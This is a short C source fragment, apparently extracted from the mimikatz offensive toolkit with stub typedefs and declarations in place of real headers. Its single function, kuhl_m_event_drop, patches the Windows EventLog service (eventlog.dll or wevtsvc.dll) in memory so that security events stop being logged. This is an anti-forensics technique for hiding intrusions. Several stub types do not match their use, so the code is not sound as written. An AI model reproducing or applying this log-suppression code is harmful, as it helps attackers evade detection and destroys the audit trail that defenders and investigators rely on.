
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int wchar_t ;
typedef int NTSTATUS ;


 int ARRAYSIZE (int ) ;
 int EventReferences ;
 int MIMIKATZ_NT_MAJOR_VERSION ;
 int STATUS_SUCCESS ;
 int TRUE ;
 int kull_m_patch_genericProcessOrServiceFromBuild (int ,int ,char*,char*,int ) ;

NTSTATUS kuhl_m_event_drop(int argc, wchar_t * argv[])
{
 kull_m_patch_genericProcessOrServiceFromBuild(EventReferences, ARRAYSIZE(EventReferences), L"EventLog", (MIMIKATZ_NT_MAJOR_VERSION < 6) ? L"eventlog.dll" : L"wevtsvc.dll", TRUE);
 return STATUS_SUCCESS;
}
